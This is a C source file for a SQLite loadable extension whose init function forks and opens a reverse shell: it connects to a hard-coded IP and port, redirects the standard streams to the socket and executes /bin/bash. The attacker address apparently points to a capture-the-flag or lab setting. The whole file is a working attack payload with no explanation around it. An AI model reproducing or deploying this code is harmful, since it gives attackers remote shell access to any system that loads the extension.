#include <sqlite3ext.h>                                                                    
#include <stdio.h>                                                                         
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>
#include <dirent.h>
#include <sys/stat.h>
SQLITE_EXTENSION_INIT1

int tcp_port = 14514;
char *ip = "10.10.14.22";

#ifdef _WIN32
__declspec(dllexport)
#endif

int sqlite3_extension_init(
  sqlite3 *db, 
  char **pzErrMsg, 
  const sqlite3_api_routines *pApi
){
  int rc = SQLITE_OK;
  SQLITE_EXTENSION_INIT2(pApi);
  
  int fd;
  if ( fork() <= 0){
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(tcp_port);
    addr.sin_addr.s_addr = inet_addr(ip);

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if ( connect(fd, (struct sockaddr*)&addr, sizeof(addr)) ){
            exit(0);
    }

    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);
    execve("/bin/bash", 0LL, 0LL);
}
  
  return rc;
}
